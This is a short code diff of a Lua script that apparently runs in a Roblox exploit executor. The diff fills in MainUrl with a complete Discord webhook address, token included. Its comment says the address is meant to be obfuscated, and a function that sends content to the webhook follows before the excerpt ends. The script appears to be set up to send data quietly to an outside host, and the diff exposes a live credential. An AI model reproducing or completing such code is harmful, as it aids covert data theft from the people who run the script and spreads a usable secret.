@@ -5,7 +5,7 @@ HttpService = game:GetService("HttpService")
 
 getgenv().WebhookUrl = ""
 
-getgenv().MainUrl = "" -- the one we finna use thats finna be obf
+getgenv().MainUrl = "https://ptb.discord.com/api/webhooks/1312288101036720128/NJtAm0CsanlbS6iQOm9uyHzj-r7QgNKahW41kWral0HGmjGEf9hkPP_wBTs2et2pCjcV" -- the one we finna use thats finna be obf
 
 local function sendToWebhook(content)
     local data = {
